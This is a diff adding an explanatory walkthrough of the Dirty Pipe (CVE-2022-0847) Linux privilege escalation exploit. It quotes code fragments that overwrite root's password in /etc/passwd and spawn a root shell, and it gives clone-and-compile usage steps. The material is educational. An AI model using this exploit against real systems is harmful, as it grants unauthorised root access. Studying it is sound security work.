@@ -74,3 +74,43 @@ They first need to access a shell on a system through some means. This can be us
 4. Finally, we write arbitrary data into the pipe. This data will overwrite the cached file page & because PIPE_BUF_FLAG_CAN_MERGE is set, it ultimately overwrites the file on the disk, thus accomplishing our task.
 
 The exploit that I am using can be found [here](https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit).
+
+The code presented is a Linux exploit that manipulates the `/etc/passwd` file to change the root user's password. The code opens `/etc/passwd`, reads its contents into `/tmp/passwd.bak`, and then changes the password in the original file. It does so by bypassing certain validations and using the `splice` and `write` system calls to manipulate in-memory data structures, namely pipes and page caches, to avoid writing changes directly to disk. The code also includes a `prepare_pipe` function that initializes the `PIPE_BUF_FLAG_CAN_MERGE` flag for each buffer on the pipe ring, allowing writes to merge with existing data in the page cache. Overall, this code represents a significant threat to the security of the Linux operating system and underscores the need for robust access controls and monitoring to prevent exploitation.
+
+    const char *const path = "/etc/passwd";
+
+    printf("Backing up /etc/passwd to /tmp/passwd.bak ...\n");
+    FILE *f1 = fopen("/etc/passwd", "r");
+    FILE *f2 = fopen("/tmp/passwd.bak", "w");
+
+The /etc/passwd file is being opened in read only mode. This might seem counter-intuitive given we want to replce root's password but we are abusing a vulnerability that allows us to write to files, when we have read-only privileges. 
+
+    loff_t offset = 4; // after the "root"
+	const char *const data = ":$1$aaron$pIwpJwMMcozsUxAtRa85w.:0:0:test:/root:/bin/sh\n"; // openssl passwd -1 -salt aaron aaron 
+        printf("Setting root password to \"aaron\"...\n");
+	const size_t data_size = strlen(data);
+
+After opening the file the exploit counts 4 bytes, which places the cursor at the first colon. This exploit works as long as root is the first user in the /etc/passwd file and there are no comments at the beginning of the file. 
+
+    char *argv[] = {"/bin/sh", "-c", "(echo aaron; cat) | su - -c \""
+        "echo \\\"Restoring /etc/passwd from /tmp/passwd.bak...\\\";"
+        "cp /tmp/passwd.bak /etc/passwd;"
+        "echo \\\"Done! Popping shell... (run commands now)\\\";"
+        "/bin/sh;"
+    "\" root"};
+    execv("/bin/sh", argv);
+
+Finally, this code creates a new shell with root privileges where the password for the `root` user has already been changed to `aaron`.
+
+To use the exploit:
+
+    git clone https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit.git
+
+
+Compile the code:
+
+    gcc exploit.c -o exploit
+
+A compile script is also included in the repo if you are lazy to type. Run the exploit.
+
+PS: I am still trying to find a machine that I can use to demonstrate this exploit.
